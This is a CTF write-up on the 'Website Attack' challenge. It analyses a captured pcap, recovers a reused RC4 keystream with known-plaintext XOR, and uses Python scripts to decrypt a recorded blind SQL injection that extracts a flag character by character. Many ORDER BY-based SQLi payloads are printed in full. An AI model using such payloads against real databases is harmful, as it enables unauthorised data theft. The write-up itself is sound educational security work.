# Website Attack (200) - 17 solves

```
Our website received an attack in 2013, we managed to capture the attack in this pcap. Can you find out if we leaked some sensitive information?
```

## The beginning - Wireshark problem
After opening the provided pcap file in Wireshark, we could see that there's a problem. Besides `tcp` packets, there were some malformed ones - which under closer inspection turned out to be named `GSM over IP`. At first we didn't know, whether it is true and the task was going to include some voice communication, but just a quick glance revealed, that these were normal HTTP protocol packets and contained some HTTP requests and responses. This situation - misinterpreting HTTP packets as IPA - disturbed us to use all of Wireshark goodnesses, like exporting HTTP objects. Due to the overwhelming size of pcap file, we just _had to_ fix it.
After a short google research, we found a solution here - [https://ask.wireshark.org/answer_link/2033/](https://ask.wireshark.org/answer_link/2033/), namely to correct protocol dissectors in: `Analyze -> Enabled protocols` by turning off `GSM over IP ip.access CCM sub-protocol` and `GSM over IP protocol as used by ip.access`. Then, we could freely filter through the capture file and use `Export Objects -> HTTP`.

## The initial analysis
(In fact, this part happened before fixing the problem with dissectors.)
Using `Follow TCP stream`, we peeked in the communication between server and client. We've observed, that:
* Client requested index page
* Client requested bootstrap.css file
* Client made a search for `kl` (`/?action=search&words=kl&sort=stock`) and was redirected to `Location: http://10.5.5.208:5000/?action=display&what=ce3926706794d911`, therefore it involved some encoding/encryption
* Client made a search for `Trad` (`/?action=search&words=Trad&sort=stock`) and was redirected to `Location: http://10.5.5.208:5000/?action=display&what=f1274d671988ce151a0b`. 
This time, the contents of _What_ parameter were longer by 4 digits (possibly 2 bytes, as what contained only hex digits), so it couldn't be a block cipher.
* Client made an improper search.
* Client made a search for `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` and got redirected to `Location: http://10.5.5.208:5000/?action=display&what=e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032e4146d4252bafb3b38212df186497a74799edb6fda5b44`.
Note, that there's something strange about these hex digits:
    ```
    e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032
    e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032
    e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032
    e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032
    e4146d4252bafb3b38212df186497a74799edb6fda5b44
    ```
   1. It's not an encoding.
   2. There's a cycle of 64 hex digits - maybe the key is short and reused?
   3. There's something at the end appended - maybe it's information about sorting (`sort=stock`)?

Anyways, the rest of the capture file comprised over two thousands of HTTP requests - which had only encrypted/encoded part inside (without plaintext as in the previous three examples). 

We've noticed some different responses - like `HTTP/1.1 500 INTERNAL SERVER ERROR`'s or `Lets not do that...` (like in TCP stream #2404).

Then, having only the following, we stopped for a longer while:
```
2:kl
16:ce3926706794d911

4:trad
20:f1274d671988ce151a0b

145:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
302:e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032e4146d4252bafb3b38212df186497a74799edb6fda5b44

12 + 2 * x
```

## The second attempt
Well, we should have paid more attention to the description. `2013` was a signifant clue - leading to [Lucky thirteen](https://en.wikipedia.org/wiki/Lucky_Thirteen_attack) attack.
In short, it's about breaking TLS - so it didn't match our scenario. But, after some more research we've found the following sentence: 
```
In March 2013, there were new attack scenarios proposed by Isobe, Ohigashi, Watanabe and Morii,[29] as well as AlFardan, Bernstein, Paterson, Poettering and Schuldt that use new statistical biases in RC4 key table[30] to recover plaintext with large number of TLS encryptions.[31][32]
```
RC4 is in fact a stream cipher. Our next search was for `recover key rc4` and `plaintext attack on rc4`, which led to [https://crypto.stackexchange.com/a/24547](https://crypto.stackexchange.com/a/24547). Bingo! There's an attack! For maths, follow the link above. What was the most important is the following:
given plaintext `M1` and ciphertext's `C1` and `C2`, we can XOR it all to receive `M2` if the key was reused. Being super excited, we've written first POC:

```
a = "af7d6f4240be9a2d31252290ef5b7e797dd7fc3be66d6d6766b5375a79b84d42"
b = "e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032"
c = "4141414141414141414141414141414141414141414141414141414141414141"
r = ""
for i in range(len(a) / 2):
	aa = ord(a[i*2:i*2 + 2].decode('hex'))
	bb = ord(b[i*2:i*2 + 2].decode('hex'))
	cc = ord(c[i*2:i*2 + 2].decode('hex'))
	
	r = r + chr(aa ^ bb ^ cc)
print r
```
Wow, it worked: `(CASE WHEN (SELECT SUBSTR(sql,1`! 
Then we've tried to decrypt one complete query, and it succeeded.
It turned out, that the appendix  to the query isn't that significant, and in fact is about result's sorting.

## The integration part
At that moment, we were able to decrypt any query we've had. But, all our work were conducted _by hand_. And there were tons of queries to decrypt.
Being lazy, we took advantage of wireshark `Export HTTP objects`, saved it all to files (note, that the query is contained in the file name, and the response is in the contents), and iterated through downloaded files.

```
from os import listdir
D = listdir('C:/Users/your_favourite_user/Desktop/exported')

for d in D:
    z = d[23:]
    r = ""
    for I in range(len(z) / 64 + 1):
            a = z[I*64:(I+1)*64]
            b = "e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032"
            c = "4141414141414141414141414141414141414141414141414141414141414141"
            for i in range(len(a) / 2):
                    aa = ord(a[i*2:i*2 + 2].decode('hex'))
                    bb = ord(b[i*2:i*2 + 2].decode('hex'))
                    cc = ord(c[i*2:i*2 + 2].decode('hex'))
    	
                    r = r + chr(aa ^ bb ^ cc)
    print r
```

What we've got was a record of _blind SQL injection_ attack!
```
(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = '{' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'z' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'y' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'x' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 's' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'r' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'q' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'p' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'w' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'v' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'u' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 't' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'k' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'j' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'i' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'h' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'o' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'n' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'm' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'l' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'c' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'b' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'a' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = '`' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'g' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'f' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'e' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'd' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = '[' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'Z' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'Y' THEN stock ELSE price END)

(CASE WHEN (SELECT SUBSTR(flag,5,1)  FROM secret_flag LIMIT 0,1) = 'X' THEN stock ELSE price END)
```

But how to know, whether the query hits or misses in this _blind SQLi_? All the responses had the same length!

By binary file comparision (we know, that the first character of flag is 'f', as the flag has the flag{hash} format) it turned out, that the only thing that is different, is the ordering of results.
Yet again, being lazy, we made some modifications to the script:

```
from os import listdir

D = listdir('C:/Users/your_favourite_user/Desktop/exported')

# Decrypt routine, without changes
def decrypt(z):
    r = ""
    for I in range(len(z) / 64 + 1):
        a = z[I*64:(I+1)*64]
	
        b = "e4146d4252bafb3b38212df186497a7479d5e95af4796e7573a65e6849952032"
        c = "4141414141414141414141414141414141414141414141414141414141414141"
        for i in range(len(a) / 2):
            aa = ord(a[i*2:i*2 + 2].decode('hex'))
            bb = ord(b[i*2:i*2 + 2].decode('hex'))
            cc = ord(c[i*2:i*2 + 2].decode('hex'))
    	
            r = r + chr(aa ^ bb ^ cc)
    return r

# A flag placeholder (string is immutable :/ )
flag = [' ' for _ in range(40)]

# For all files
for d in D:
    f = open('C:/Users/your_favourite_user/Desktop/exported/' + d, 'r')
    fc = f.read()
    # If it's a hit (the ordering of products is different)
    if fc.find('hyper') < fc.find('Traditional'):
        # d[23:] == Get only the ciphertext from filename
        r = decrypt(d[23:])
        
        # If the SQLi attempt targeted flag (not the SQL schema!)        
        if r.find('flag') != -1:
            chi = r.find("'") + 1
            if chi != 0:
                ch = r[chi]
            indi = r.find(',') + 1
            if indi != 0:
                ind = r[indi:indi+2]
                if ind[1] == ',':
                    ind = ind[0]
            if chi != 0:
                print ind, ch
                flag[int(ind)] = ch
            
print ''.join(flag)
```
And voila! Great challenge - thanks for the organizers!

---
hh, **PUT CTF team**
